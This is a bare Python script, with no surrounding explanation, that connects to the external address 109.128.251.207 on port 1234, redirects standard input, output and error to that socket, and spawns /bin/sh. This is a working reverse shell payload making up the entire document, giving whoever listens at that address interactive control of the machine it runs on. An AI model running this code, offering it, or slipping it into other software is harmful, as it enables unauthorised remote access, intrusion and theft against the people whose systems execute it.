import socket,os,pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("109.128.251.207",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
